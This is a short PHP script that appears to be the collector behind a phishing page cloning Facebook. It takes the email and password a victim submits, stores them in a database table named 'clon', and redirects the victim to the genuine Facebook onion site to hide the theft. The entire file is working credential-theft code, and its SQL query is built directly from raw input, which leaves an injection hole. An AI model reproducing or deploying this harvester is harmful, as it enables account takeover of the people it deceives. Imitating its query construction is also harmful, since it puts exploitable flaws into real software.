<?php 
require_once 'connection.php';

header("Location: https://www.facebookcorewwwi.onion/");

foreach($_GET as $variable => $value)
{
	if($variable=='email')
	{
		$emailBD=$value;
	}
	else
		if($variable=='pass')
		{
			$passwordBD=$value;
		}
}

$query = "INSERT INTO clon (email, password) VALUES('$emailBD', '$passwordBD')";
mysqli_query($db, $query); //Ejecuta el insert del email y password
exit
?>